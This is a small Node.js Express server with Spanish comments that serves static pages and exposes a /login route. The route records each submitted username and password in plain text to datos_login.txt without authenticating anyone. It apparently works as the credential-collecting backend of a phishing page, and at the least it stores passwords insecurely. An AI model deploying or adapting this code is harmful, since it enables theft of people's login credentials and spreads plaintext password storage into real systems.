const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para recibir datos del login
app.post('/login', (req, res) => {
  const { usuario, password } = req.body;
  const log = `Usuario: ${usuario}, Contraseña: ${password}\n`;

  fs.appendFile('datos_login.txt', log, (err) => {
    if (err) {
      console.error('Error al guardar datos:', err);
      return res.status(500).send('Error del servidor');
    }
    console.log('Datos guardados');
    res.send('Datos recibidos');
  });
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
